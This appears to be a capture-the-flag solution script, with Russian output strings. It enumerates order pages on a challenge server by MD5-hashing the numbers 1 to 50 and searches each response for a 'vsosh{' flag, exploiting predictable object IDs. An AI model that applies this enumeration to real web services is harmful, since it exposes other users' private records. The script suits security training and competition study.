#!/usr/bin/env python3
import hashlib
import requests

BASE_URL = "http://ctfinf.ru:10009/"


def find_flag():
    print("🔍 Поиск флага в заказах 1-50...")
    print("-" * 50)

    for i in range(1, 51):
        order_id = hashlib.md5(str(i).encode()).hexdigest()
        url = f"{BASE_URL}/orders/{order_id}"
        print(url)
        try:
            response = requests.get(url, timeout=5)
            if "vsosh{" in response.text:
                print(f"🎉 Флаг найден в заказе №{i}")
                print(f"🆔 Order ID: {order_id}")
                print(f"🔗 URL: {url}")

                import re
                flag_match = re.search(r'vsosh\{[^}]+\}', response.text)
                if flag_match:
                    print(f"🏴 Флаг: {flag_match.group(0)}")
                break
        except:
            continue

    print("-" * 50)
    print("Пример ID для проверки:")
    print(f"Заказ №19: {hashlib.md5('19'.encode()).hexdigest()}")


if __name__ == "__main__":
    find_flag()